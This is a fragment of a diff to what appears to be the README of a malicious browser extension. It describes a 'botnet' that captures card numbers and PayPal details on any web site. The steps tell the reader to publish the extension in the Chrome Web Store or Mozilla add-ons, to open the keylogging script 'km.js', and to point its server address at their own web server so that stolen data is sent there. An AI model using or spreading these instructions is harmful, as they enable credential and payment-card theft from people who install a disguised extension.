@@ -26,7 +26,7 @@ botnet browser chrome,mozilla firefox,capture card number any web site ,paypal,f
 -publish your extension in  chrome web store or adon mozilla 
 
 # how it works ?
-1) open keylog
+1) open "km.js"
 
 change http://1127.0.0.1     to your web server 
 
